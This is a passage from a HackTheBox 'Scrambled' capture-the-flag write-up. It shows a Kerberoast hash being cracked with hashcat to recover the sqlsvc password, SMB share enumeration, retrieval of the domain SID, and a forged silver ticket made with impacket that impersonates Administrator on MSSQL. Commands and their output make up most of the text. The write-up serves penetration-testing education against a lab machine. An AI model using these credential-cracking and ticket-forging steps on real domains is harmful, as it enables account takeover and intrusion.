font-style: inherit;">----------------------------</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">------</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--------</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--------------------------</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--------------------------</span>  <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">----------</span></span>
<span id="cb15-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MSSQLSvc/dc1.scrm.local:1433</span>  sqlsvc            2021-11-03 17:32:02.351452  2022-09-15 09:27:04.762825             </span>
<span id="cb15-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MSSQLSvc/dc1.scrm.local</span>       sqlsvc            2021-11-03 17:32:02.351452  2022-09-15 09:27:04.762825  </span>
<span id="cb15-10"></span>
<span id="cb15-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled cat krb.hash </span>
<span id="cb15-12"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$krb5tgs$2</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$*</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sqlsvc</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$SCRM</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.LOCAL</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$scrm</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.local/sqlsvc*</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$4</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b6ea2059c13cd55ea179c99769420a2</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$d6a24837673cc0774a4f9ff2037dcc4d9673e58d019f87e1559ff71237f0af0bb2ece0909fbe34da3ec1374722d8252cec867d193454c3f3ed07bec39662318bdc1c538969b19ec0647a924fc9d927e0bb92f796426a7df56e2127b9db9f12f8a78fa5ae6f15524c1849567b2a2d756358891a514ef9ec50cc8fd8e494420e34be9de2df5002f69f38c75a5638ab7a1bb0f3f67a04e9247813381ce075cc2ac7d6388dedc3f2106b3eb029b019793333160cee7014499c1c4da9400ac84404d6671378d808cf6ad9962f7bc4de7a9e1082b064af72ba4aef26d5a15f3289a03f3edbde1a5b94ceba24ef98f18a316301fc5b5bd76d23056d8d6217a8b3684f07db2255f8fc733f570ef228021b373312c2325a0e3b203b3bd2ad0b408630ae2597458b9c70a9edd0b29810b3263664cd447dc139bbedf64dc6fe1a0473202569abc3837ffa15d4d199d63d476afd10db6ef64a187976b5e0713d225adac86360f937b97b5be092e167633b60e7eb3b3266e5bd9ababf1aac068248f2dce6f9c2f2fe2c45958f0d41c722c3734e4dcde7b8e90a3a0d39ed5ba02801a66f76bc7e63d85b62f3b8c823a0169cba9b019d11ea31170c6e6afe4a1f5ad122953b8f7debf980b88505914f0193235be2a082fea598052a99475e6ee717aa75deb1560b4dee38d4c5a95ef9c98212b39493506cea39aa07808995e4ddd19ef96339d33df09b72d7b57c98aa2c53e43ba4062e71897228df12bce7c0ff6bc9d0ddb01c873ee760700a9aee6ffa5cc84307938d14d81ef55ffe369b807da870c2d99dbe51c78fadbcbf4affbb749e3d8ef165da194a1218d3d0616771c7c059350b65a7bbd8cf56684e86e721b9ebac1459c50d0ff49c2ca5ab75122d22c9be24e97d4e4e520e278dd0b2ee34ce070e1feb49626c279e27c18e94a29bddd777491bcd1559285c5e39064def9aacbeae5bb1172c552538d6d421360eb6af3ba2c846a6688cce09f0c26535f6ca1caf9bafb0eb1eb935703102b31e0e59436a3dcc1214e222e261637ff50658acc114b7f0442b3c51543a87e359cc58e0854defd6c5470cc048710c97915747a61a8fa750fcf23743500fada571368dfd5fc49e912f69036ab1d9d4326bf03d88f69048c3933c990661f6435227dae066b29486ff046c8e351d4a6e5ca6676ebd2e7eff30aa0a6a7370ca1e816865be8a7146e569e972410175ffeab4ae1571c9e2e423c981663686f9aa591a074237d36f3eca8d6355ebddb29c10c2ecee28c066ba292e25e4a04a4db725083554c7aabea36342a6a01900e018673ec1d2fd6296fc03662f7b085bbdc2b166580a9cdfb682cfe50392f8146fd87357672bc80016f2756e26bb1237b06942357595f2d3d96b9340efa5f371a2f94d709ca1a80dd37cdc89963c3b06d2c2304d0b92f24ed231b3</span></span></code></pre></div>
<p>Crack it:</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m13100</span> krb.hash /usr/share/wordlists/rockyou.txt</span>
<span id="cb16-2"></span>
<span id="cb16-3"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$krb5tgs$2</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$*</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sqlsvc$...:Pegasus60</span></span>
<span id="cb16-4">                                                          </span>
<span id="cb16-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Session..........:</span> hashcat</span>
<span id="cb16-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Status...........:</span> Cracked</span></code></pre></div>
<p>Notice the username <code>sqlsvc</code>, we’ve just cracked credentials for SQL - <code>sqlsvc:Pegasus60</code></p>
</section>
<section id="step-3---more-secrets" class="level3">
<h3 class="anchored" data-anchor-id="step-3---more-secrets">Step 3 - More secrets</h3>
<p>We’ve got a username, TGT and password, meaning now we should be able to enumerate more services. Trying to enumerate SMB with <code>smbclient</code> fails:</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dc-ip</span> 10.10.11.168</span>
<span id="cb17-2"></span>
<span id="cb17-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">scrm.local\ksimpson:ksimpson@dc1.scrm.local:</span> Not enough <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\'</span> characters in service</span></code></pre></div>
<p>However, downloading and using <code>smbclient.py</code> works just fine:</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbclient.py</span>
<span id="cb18-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled python smbclient.py scrm.local/ksimpson:ksimpson@dc1.scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-dc-ip</span> 10.10.11.168 </span>
<span id="cb18-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb18-4"></span>
<span id="cb18-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Type</span> help for list of commands</span>
<span id="cb18-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># shares</span></span>
<span id="cb18-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ADMIN$</span></span>
<span id="cb18-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C$</span></span>
<span id="cb18-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HR</span></span>
<span id="cb18-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">IPC$</span></span>
<span id="cb18-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">IT</span></span>
<span id="cb18-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NETLOGON</span></span>
<span id="cb18-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Public</span></span>
<span id="cb18-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sales</span></span>
<span id="cb18-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SYSVOL</span></span></code></pre></div>
<p>Look around and download potentially interesting files.</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># use Sales</span></span>
<span id="cb19-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> SMB SessionError: STATUS_ACCESS_DENIED<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">{Access</span> Denied} A process has requested access to an object but has not been granted those access rights.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb19-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># use IT</span></span>
<span id="cb19-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> SMB SessionError: STATUS_ACCESS_DENIED<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">{Access</span> Denied} A process has requested access to an object but has not been granted those access rights.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb19-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># use HR</span></span>
<span id="cb19-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> SMB SessionError: STATUS_ACCESS_DENIED<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">{Access</span> Denied} A process has requested access to an object but has not been granted those access rights.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb19-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># use Public</span></span>
<span id="cb19-8"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># ls</span></span>
<span id="cb19-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drw-rw-rw-</span>          0  Thu Nov  4 23:23:19 2021 .</span>
<span id="cb19-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drw-rw-rw-</span>          0  Thu Nov  4 23:23:19 2021 ..</span>
<span id="cb19-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-rw-</span>     630106  Fri Nov  5 18:45:07 2021 Network Security Changes.pdf</span>
<span id="cb19-12"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># get Network Security Changes.pdf</span></span></code></pre></div>
<p><img src="https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/images/scrambled03.png" class="img-fluid"></p>
<p>The first vulnerability we already knew about since it was made public on the intranet (port 80), however the SQL information is new. This sounds perfect for us, as we just extracted and cracked the TGT for user <code>sqlsvc</code> - how do we exploit this?</p>
</section>
<section id="step-4---silvet-ticket" class="level3">
<h3 class="anchored" data-anchor-id="step-4---silvet-ticket">Step 4 - Silvet Ticket</h3>
<p>Reading about Silver ticket attacks the requirements are knowledge of:</p>
<ul>
<li><p><strong>Domain Name</strong> = scrm.local</p></li>
<li><p><strong>Domain SID</strong> = unknown, should be able to find</p></li>
<li><p><strong>Username to impersonate</strong> = administrator</p></li>
<li><p><strong>krbtgt NTLM hash</strong> = not sure, but we have the password <code>Pegasus60</code> so should be able to generate it</p></li>
</ul>
<p>I know we can find Domain SID through <code>rpcclient</code> so lets try that first:</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled rpcclient dc1.scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--no-pass</span></span>
<span id="cb20-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Cannot</span> connect to server.  Error was NT_STATUS_NO_LOGON_SERVERS</span></code></pre></div>
<p>Impackets <code>lookupsid</code> don’t have an option to connect using kerberos so that’s a no-go as well..</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-lookupsid scrm.local/ksimpson:ksimpson@dc1.scrm.local</span>
<span id="cb21-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb21-3"></span>
<span id="cb21-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Brute forcing SIDs at dc1.scrm.local</span>
<span id="cb21-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> StringBinding ncacn_np:dc1.scrm.local<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">ipe</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\l</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">sarpc</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span></span>
<span id="cb21-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> SMB SessionError: STATUS_NOT_SUPPORTED<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">The</span> request is not supported.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb21-7"></span>
<span id="cb21-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-lookupsid scrm.local/sqlsvc:Pegasus60@dc1.scrm.local</span>
<span id="cb21-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb21-10"></span>
<span id="cb21-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Brute forcing SIDs at dc1.scrm.local</span>
<span id="cb21-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> StringBinding ncacn_np:dc1.scrm.local<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">ipe</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\l</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">sarpc</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span></span>
<span id="cb21-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> SMB SessionError: STATUS_NOT_SUPPORTED<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">The</span> request is not supported.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p><a href="https://medium.com/@browninfosecguy/windows-authentication-and-attacks-101-part-e-cc249ea3751">Reading</a> about the TGT I find this image:</p>
<p><img src="https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/images/scrambled04.png" class="img-fluid"></p>
<p>As shown the TGT contains Privilege Attribute Certificate (PAC) which is used for authorization purposes. The PAC contains user and group membership information, but also the <strong>domain SID</strong>. We can request PAC for a user from the DC using Impackets <code>getPac</code> script.</p>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-getPac <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-targetUser</span> ksimpson scrm.local/ksimpson:ksimpson</span>
<span id="cb22-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb22-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain</span> SID: S-1-5-21-2743207045-1827831105-2542523200</span>
<span id="cb22-4"></span>
<span id="cb22-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-getPac <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-targetUser</span> sqlsvc scrm.local/sqlsvc:Pegasus60</span>
<span id="cb22-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb22-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain</span> SID: S-1-5-21-2743207045-1827831105-2542523200</span></code></pre></div>
<p>Lastly we need the NTLM hash, simply generate it with what ever <a href="https://codebeautify.org/ntlm-hash-generator">online generator</a> you find. <code>Pegasus60 -&gt; B999A16500B87D17EC7F2E2A68778F05</code></p>
<p>To make a summary we now have everything to create our ticket:</p>
<ul>
<li><p><strong>Domain Name</strong> = scrm.local</p></li>
<li><p><strong>Domain SID</strong> = S-1-5-21-2743207045-1827831105-2542523200</p></li>
<li><p><strong>Username to impersonate</strong> = administrator</p></li>
<li><p><strong>krbtgt NTLM hash</strong> = B999A16500B87D17EC7F2E2A68778F05</p></li>
</ul>
<div class="sourceCode" id="cb23" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-ticketer <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-nthash</span> B999A16500B87D17EC7F2E2A68778F05 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-domain-sid</span> S-1-5-21-2743207045-1827831105-2542523200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-domain</span> scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-user-id</span> 500 Administrator</span>
<span id="cb23-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb23-3"></span>
<span id="cb23-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Creating basic skeleton ticket and PAC Infos</span>
<span id="cb23-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Customizing ticket for scrm.local/Administrator</span>
<span id="cb23-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     PAC_LOGON_INFO</span>
<span id="cb23-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     PAC_CLIENT_INFO_TYPE</span>
<span id="cb23-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     EncTicketPart</span>
<span id="cb23-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     EncAsRepPart</span>
<span id="cb23-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Signing/Encrypting final ticket</span>
<span id="cb23-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     PAC_SERVER_CHECKSUM</span>
<span id="cb23-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     PAC_PRIVSVR_CHECKSUM</span>
<span id="cb23-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     EncTicketPart</span>
<span id="cb23-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     EncASRepPart</span>
<span id="cb23-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Saving ticket in Administrator.ccache</span></code></pre></div>
<p>Testing to connect to the MsSQL service we fail, even though we exported the ticket..</p>
<div class="sourceCode" id="cb24" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled export KRB5CCNAME=Administrator.ccache</span>
<span id="cb24-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-mssqlclient dc1.scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span></span>
<span id="cb24-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb24-4"></span>
<span id="cb24-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Encryption required, switching to TLS</span>
<span id="cb24-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> Kerberos SessionError: KRB_AP_ERR_BAD_INTEGRITY<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Integrity</span> check on decrypted field failed<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>I got stuck here for a while before I noticed that I forgot the <strong>SPN</strong> when creating my impersonated Administrator ticket. Reading the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/native-client/features/service-principal-name-spn-support-in-client-connections?view=sql-server-ver16#specifying-the-spn">Microsoft docs</a> the SPN format is <code>MSSQLSvc/fqdn</code>, so lets re-create the ticket.</p>
<div class="sourceCode" id="cb25" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-ticketer <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-nthash</span> B999A16500B87D17EC7F2E2A68778F05 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-domain-sid</span> S-1-5-21-2743207045-1827831105-2542523200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-domain</span> scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-spn</span> MSSQLSvc/dc1.scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-user-id</span> 500 Administrator</span>
<span id="cb25-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb25-3"></span>
<span id="cb25-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Creating basic skeleton ticket and PAC Infos</span>
<span id="cb25-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Customizing ticket for scrm.local/Administrator</span>
<span id="cb25-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     PAC_LOGON_INFO</span>
<span id="cb25-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     PAC_CLIENT_INFO_TYPE</span>
<span id="cb25-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     EncTicketPart</span>
<span id="cb25-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     EncTGSRepPart</span>
<span id="cb25-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Signing/Encrypting final ticket</span>
<span id="cb25-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     PAC_SERVER_CHECKSUM</span>
<span id="cb25-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     PAC_PRIVSVR_CHECKSUM</span>
<span id="cb25-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     EncTicketPart</span>
<span id="cb25-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     EncTGSRepPart</span>
<span id="cb25-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Saving ticket in Administrator.ccache</span>
<span id="cb25-16"></span>
<span id="cb25-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled export KRB5CCNAME=Administrator.ccache</span>
<span id="cb25-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-mssqlclient dc1.scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span></span>
<span id="cb25-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb25-20"></span>
<span id="cb25-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Encryption required, switching to TLS</span>
<span id="cb25-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> ENVCHANGE<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">DATABASE</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Old Value: master, New Value: master</span>
<span id="cb25-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> ENVCHANGE<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LANGUAGE</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Old Value: , New Value: us_english</span>
<span id="cb25-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> ENVCHANGE<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PACKETSIZE</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Old Value: 4096, New Value: 16192</span>
<span id="cb25-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> INFO<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">DC1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Line 1: Changed database context to <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'master'</span>.</span>
<span id="cb25-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> INFO<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">DC1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Line 1: Changed language setting to us_english.</span>
<span id="cb25-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> ACK: Result: 1 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Microsoft SQL Server <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">150</span> 7208<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> </span>
<span id="cb25-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[!]</span> Press help for extra shell commands</span>
<span id="cb25-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SQL</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span></code></pre></div>
<p>It works! We’re connected to the SQL Service.</p>
</section>
<section id="step-5---mssql" class="level3">
<h3 class="anchored" data-anchor-id="step-5---mssql">Step 5 - MSSQL</h3>
<p>Enumerate the SQL Service:</p>
<div class="sourceCode" id="cb26" style="background: #f1f3f5;"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb26-1">SQL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">SELECT</span> name <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">FROM</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">master</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">..</span>sysdatabases;</span>
<span id="cb26-2">name                                                                                                                               </span>
